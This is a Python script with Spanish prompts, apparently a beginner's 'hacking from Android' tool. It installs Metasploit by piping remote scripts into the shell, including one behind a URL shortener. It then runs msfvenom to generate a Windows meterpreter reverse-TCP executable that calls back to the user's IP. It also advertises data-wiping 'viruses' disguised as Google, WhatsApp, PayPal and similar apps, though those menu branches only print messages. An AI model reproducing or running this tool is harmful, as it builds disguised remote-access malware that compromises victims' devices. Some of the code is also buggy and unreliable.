#----import system and colorama---

from os import system
from colorama import Fore

#----------------system comand's--

system("pip install colorama")
system("clear")

#----------Operative System-------

print(Fore.BLUE+ "Sistema Operativo, si ya tienes instalado MetaSploit usa la opcion 4:" , Fore.RED+ "\n[1]"+ Fore.YELLOW+ "Kali Linux" , Fore.BLUE+ "\n[2]"+ Fore.YELLOW+ "Otra distribucion de Linux..." , Fore.RED+ "\n[3]"+ Fore.YELLOW+ "Termux" + Fore.BLUE+ "\n[4]" + Fore.RED+ "Instalado previamente")
System=int(input(Fore.BLUE+ "#!~Elije una opcion: "))


if System == 1:
    system("clear")
    system("apt install curl -y")
    system("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall")
    system("chmod 755 msfinstall")
    system("./msfinstall")
    
if System == 2:
    system("clear")
    system("apt install curl wget -y")
    system("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall")

if system == 3:
    system("clear")
    system("source <(curl -fsSL https://kutt.it/msf)")



#----------------Banner-----------

system("clear")
print("```````````````````````````````````````````````````````````")
print(Fore.BLUE+ "´´´´´´´´´´´´´´´´´´´ ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´´´´`")
print("´´´´´´´´´´´´´´´´´¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´")
print("´´´´´´´´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´´´´´´´´´´´´´")
print("´´´´´´´´´´´´´¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´´´")
print("´´´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´´")
print("´´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´`´´´´´´´´´´´¶¶´´´´´´´´´´`")
print("´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´")
print("´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶´´´´´´´´´´")
print("´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶´´´´´´´´´´")
print("´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶´´´´´´´´´´")
print("´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶´´´´´´´´´´")
print("´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´")
print("´´´´´´´´´´´¶¶´¶¶´´´¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶´´´¶¶´¶¶´´´´´´´´´´´")
print("´´´´´´´´´´´´¶¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶¶¶´´´´´´´´´´´")
print("´´´´´´´´´´´´´¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶´´´´´´´´´´´´´")
print("´´´´¶¶¶´´´´´´´¶¶´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´´¶¶´´´´´´¶¶¶¶´´´")
print("´´´¶¶¶¶¶´´´´´¶¶´´´¶¶¶¶¶¶¶´´´¶¶¶´´´¶¶¶¶¶¶¶´´´¶¶´´´´´¶¶¶¶¶¶´´")
print("´´¶¶´´´¶¶´´´´¶¶´´´´´¶¶¶´´´´¶¶¶¶¶´´´´¶¶¶´´´´´¶¶´´´´¶¶´´´¶¶´´")
print("´¶¶¶´´´´¶¶¶¶´´¶¶´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´¶¶´´¶¶¶¶´´´´¶¶¶´")
print("¶¶´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´¶¶")
print("¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶´´´´¶¶¶¶¶¶¶´´´´¶¶¶¶¶¶¶¶´´´´´´¶¶¶¶¶¶¶¶")
print("´´¶¶¶¶´¶¶¶¶¶´´´´´´¶¶¶¶¶´´´´´´´´´´´´´´¶¶¶´¶¶´´´´´¶¶¶¶¶¶´¶¶¶´")
print("´´´´´´´´´´¶¶¶¶¶¶´´¶¶¶´´¶¶´´´´´´´´´´´¶¶´´¶¶¶´´¶¶¶¶¶¶´´´´´´´´")
print("´´´´´´´´´´´´´´¶¶¶¶¶¶´¶¶´¶¶¶¶¶¶¶¶¶¶¶´¶¶´¶¶¶¶¶¶´´´´´´´´´´´´´´")
print("´´´´´´´´´´´´´´´´´´¶¶´¶¶´¶´¶´¶´¶´¶´¶´¶´¶´¶¶´´´´´´´´´´´´´´´´´")
print("´´´´´´´´´´´´´´´´¶¶¶¶´´¶´¶´¶´¶´¶´¶´¶´¶´´´¶¶¶¶¶´´´´´´´´´´´´´´")
print("´´´´´´´´´´´´¶¶¶¶¶´¶¶´´´¶¶¶¶¶¶¶¶¶¶¶¶¶´´´¶¶´¶¶¶¶¶´´´´´´´´´´´´")
print("´´´´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶´´´´´´´´´´´´´´´´´¶¶´´´´´´¶¶¶¶¶¶¶¶¶´´´´")
print("´´´¶¶´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´´´¶¶´´´")
print("´´´´¶¶¶´´´´´¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶´´´´´¶¶¶´´´´")
print("´´´´´´¶¶´´´¶¶¶´´´´´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´´´´¶¶¶´´´¶¶´´´´´´")
print("´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´")
print("´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´´´´´´")
print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.RED+ "Creador:"+ Fore.GREEN+ "74lg0" + Fore.BLUE+ "´´´´´´´´´´´´´´´´´´´´´´´")
print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.RED+ "Version:"+ Fore.BLUE+ "1.2"+Fore.BLUE+ "´´´´´´´´´´´´´´´´´´´´´´´´´´´")
print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.YELLOW+ "Hackeando desde android"+ Fore.BLUE+ "´´´´´´´´´´´´´´´")

#----------------Menu-------------

#Nota: int(input()) te toma un numero literal, input() te lo toma como string

print(Fore.RED+ "[1]" + Fore.YELLOW+ "Viruz acceso al dispositivo" , Fore.RED+ "\n[2]"+ Fore.YELLOW+ "Viruz elimina todo")
eleccion=int(input(Fore.YELLOW+ "~~~Elije una opcion: "))

#----------------Options1 and banner2----------

if eleccion == 1:
    system("clear")
    print("")
    print("")
    print(Fore.RED+ "          .n                     .             .                n.")
    print("     .n                     .             .                n.")
    print("  . .dP                   dP               9b               9b   .")
    print(" 4  qXb         .        dX                 Xb       .      dXp   t")
    print("dX.  9Xb      .dXb     __                     __    dXb.   dXP   .Xb")
    print("9XXb._     _.dXXXXb dXXXXbo.               dXXXXb dXXXXb._   _.dXXP")
    print(" 9XXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXP")
    print("   9XXXXXXXXXXXXXXX ~   ~ OOO8b   d8OOO ~   ~ XXXXXXXXXXXXXXXXXP")
    print("     9XXXXXP   9XX      "+ Fore.YELLOW+ "*     " + Fore.RED+ "98v8P" + Fore.YELLOW+"      *     "+ Fore.RED+ "XXP   9XXXXXXXP")
    print("      ~~~       9X.          .db|db.          .XP       ~~~")
    print("                  )b.  .dbo.dP' v  9b.odb.  .dX(")
    print("                ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.")
    print("               dXXXXXXXXXXXP'   .    9XXXXXXXXXXXb")
    print("             dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb")
    print("             9XXb'    XXXXXb.dX|Xb.dXXXXX'    dXXP")
    print("                       9XXXXXX(   )XXXXXXP")
    print("                       XXXX X. v .X XXXX")
    print("                        XP^X' b   d' X^XX")
    print("                        X. 9         P )X")
    print("                         b          '  d'")
    print(Fore.RED+ "                          Creador:"+ Fore.YELLOW+ "74lg0")
    print(Fore.RED+ "                          Version:"+ Fore.BLUE+ "1.2")
    print(Fore.YELLOW+ "                        Hacking MetaSploit")
    

    print(Fore.YELLOW+ "\n------------------------------------------")
    print("Nota:El archivo solo funciona para windows")
    print("------------------------------------------")
    print("Jenerando archivo...")
    eleccionmeta=input(Fore.GREEN+ "Ingresa tu IP privada: ")#<-------Direccion IP privada
    
    eleccionmeta2=input("Ingresa el nombre del archivo junto con el nombre de su extencion --> .exe ")#<-------Nombre del archivo
    
    system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + eleccionmeta + " LPORT=4444 -f exe >" + eleccionmeta2)#<-------Jenerando archivo...

#----------------Options2 and banner3--------------------

elif eleccion == 2:
    system("clear")
    
    
    print(Fore.RED+ "                           ,--.")
    print("                          {    }")
    print("                          K,   }")
    print("                         /  ~Y")
    print("                    ,   /   /")
    print("                   {_'-K.__/")
    print("                      /-.__L._")
    print("                     /  ' / \_}")
    print("                    /  ' /")
    print("            ____   /  ' ")
    print("     ,-'~~~~    ~~/  ' /")
    print("   ,'             ~~~  ',")
    print("  (                        Y")
    print(" {                         I")
    print("{      -                    `,")
    print("|        ,                   )")
    print("|        |   ,..__      __. Y")
    print("|    .,_./  Y   / ^Y   J   )|")
    print("\           |  /   |   |   ||")
    print(" \          L_/    . _ (_,. (" + Fore.BLUE+ " Creador:74lg0")
    print(Fore.RED+ "  \,   ,      ^^^^ / |      )"+ Fore.YELLOW+ " Version:"+ Fore.RED+ "1.2")
    print(Fore.RED+ "    \_  \          / L]     /"+ Fore.GREEN+ " Hacking MetaSploit")
    print(Fore.RED+ "       -_~-,       ` `   ./")
    print("           {_            )")
    print("             ^^\..___,.--")
    
    #--------------15 archivoz-----------------
 
    print(Fore.BLUE+ "\n!!!ATENCION ESTOS VIRUZ ELIMINAN TODA LA INFORMACION DE LOS DISPOSITIVOZ!!!" , "\n-----------los archivoz fueron tomados de otro script (papaviruz)----------")
    print(Fore.RED+ "\n[1]" + Fore.YELLOW+ "Google.apk" , Fore.RED+ "\n[2]" + Fore.YELLOW+ "PlayStore.apk" , Fore.RED+ "\n[3]"+ Fore.YELLOW+ "Termux.apk" , Fore.RED+ "\n[4]" , Fore.YELLOW+ "Galeria.apk" , Fore.RED+ "\n[5]" , Fore.YELLOW+ "Gmail.apk" , Fore.RED+ "\n[6]" , Fore.YELLOW+ "Whatsapp Espia.apk" , Fore.RED+ "\n[7]" , Fore.YELLOW+ "Camara.apk" , Fore.RED+ "\n[8]" + Fore.YELLOW+ "Internet gratis.apk" , Fore.RED+ "\n[9]" , Fore.YELLOW+ "Whatsapp lite.apk" , Fore.RED+ "\n[10]" + Fore.YELLOW+ "PayPal.apk")
    
    eleccionarch=input(Fore.RED+ "~~Elige una opcion: ")

#-------Options2 and opcion1-------
    
    if eleccionarch == "1":
        system("clear")
        
        print(Fore.BLUE+" _                                                     _")#<--------Banner------
        print("/ \    /\         __                          _   __  /_/ __")
        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")

        print("")
        elecciondirectorio=input(Fore.YELLOW+ "Mover a: ")
        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio)

#-----Options2 and opcion2----------

    elif eleccionarch == "2":
        system("clear")
        
        print(Fore.BLUE+" _                                                     _")#<--------Banner------
        print("/ \    /\         __                          _   __  /_/ __")
        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
        
        print("")
        elecciondirectorio1=input(Fore.YELLOW+ "Mover a: ")
        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio1)

#-----Options2 and opcion3----------

    elif eleccionarch == "3":
        system("clear")
        print(Fore.BLUE+" _                                                     _")#<--------Banner------
        
        print("/ \    /\         __                          _   __  /_/ __")
        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")

        print("")
        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
#-----Options3 and Options4----------

    elif eleccionarch == "4":
        system("clear")
        print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
        print("/ \    /\         __                          _   __  /_/ __")
        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
        print("")
        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)

#-----Options3 and Options5---------

    elif eleccionarch == "5":
        system("clear")
        print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
        print("/ \    /\         __                          _   __  /_/ __")
        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
        print("")
        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)

#-----Options3 and Options6---------

    elif eleccionarch == "6":
        system("clear")
        print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
        print("/ \    /\         __                          _   __  /_/ __")
        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
        print("")
        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)

#-----Options3 and Options7-------------------

    elif eleccionarch == "7":
        system("clear")
        print(Fore.BLUE+"\n _                                                     _") #<--------Banner------
        print("/ \    /\         __                          _   __  /_/ __")
        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
        print("")
        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
        
#-----Options3 and Options8----------

    elif eleccionarch == "8":
        system("clear")
        print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
        print("/ \    /\         __                          _   __  /_/ __")
        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
        print("")
        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)

#-----Options3 and Options9----------

    elif eleccionarch == "9":
        system("clear")
        print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
        print("/ \    /\         __                          _   __  /_/ __")
        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
        print("")
        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)

#<-----Options3 and Options10---------

    elif eleccionarch == "10":
        system("clear")
        print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
        print("/ \    /\         __                          _   __  /_/ __")
        print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
        print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
        print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
        print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
        print("")
        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)


#---------Invalid Options----------
    
    else:
        
        print("Elije una opcion valida...")

#---------Invalid Options----------

else:
    system("clear")
    print(Fore.RED+ "\n      .:okOOOkdc'           'cdkOOOko:.")#<--------Banner for invalid options---------
    print("    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.")
    print("   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:")
    print("  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'")
    print("  oOOOOOOOO.     oOOOOoOOOOl.    ,OOOOOOOOo")
    print("  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx")
    print("  lOOOOOOOO.         ;d;         ,OOOOOOOOl")
    print("  .OOOOOOOO.   .;           ;    ,OOOOOOOO.")
    print("   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc")
    print("    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo")
    print("     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl")
    print("      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;")
    print("       .dOOo   .OOOOocccxOOOO.   xOOd.")
    print("         ,kOl  .OOOOOOOOOOOOO. .dOk,")
    print("          :kk;.OOOOOOOOOOOOO.cOk:")
    print("            ;kOOOOOOOOOOOOOOOk:")
    print("              ,xOOOOOOOOOOOx,")
    print("                .lOOOOOOOl.")
    print("                   ,dOd,")
    print("                     .")
    print(Fore.YELLOW+ "elije una opcion valida y vuelve a intentarlo" , Fore.BLUE+ ":>")
